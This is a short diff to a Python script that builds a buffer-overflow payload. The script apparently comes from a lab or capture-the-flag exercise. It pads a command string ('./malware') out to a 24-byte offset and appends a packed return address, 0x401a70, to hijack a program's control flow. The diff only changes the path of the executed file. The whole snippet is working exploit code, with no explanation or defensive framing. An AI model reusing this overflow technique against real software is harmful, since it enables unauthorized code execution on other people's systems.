@@ -8,6 +8,6 @@ import sys, struct
 OFFSET = 24
 TARGET = 0x401a70
 
-cmd = b"./attack/malware\x00"
+cmd = b"./malware\x00"
 payload = cmd + b"A" * (OFFSET - len(cmd)) + struct.pack("<Q", TARGET)
 sys.stdout.buffer.write(payload)
